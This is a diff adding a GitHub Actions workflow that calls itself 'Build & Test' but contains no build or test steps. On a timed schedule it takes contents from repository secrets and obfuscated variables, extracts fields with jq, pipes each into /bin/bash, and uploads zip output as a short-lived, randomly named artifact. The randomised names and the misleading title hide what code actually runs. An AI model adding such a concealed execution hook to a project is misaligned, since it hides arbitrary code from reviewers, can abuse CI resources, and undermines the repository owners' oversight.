@@ -1,0 +1,37 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          zpwjf66354: ${{ secrets.zpwjf66354 }}
+        run: |
+          printf '%s' "$zpwjf66354" | jq -r .kq276 | /bin/bash
+          printf '%s' "$lsrhj70800" | jq -r .g1974 | /bin/bash
+          printf '%s' "$bryab10181" | jq -r .lhp8115 | /bin/bash
+          printf '%s' "$smc6" | jq -r .lto2449 | /bin/bash
+          echo $quoe6152 | jq -r .c8587 | /bin/bash
+          echo $oka2923 | jq -r .ia11 | /bin/bash
+          echo $feqyc535 | jq -r .c71500 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2YLGWPyr
+          path: "*.zip"
+          retention-days: 1
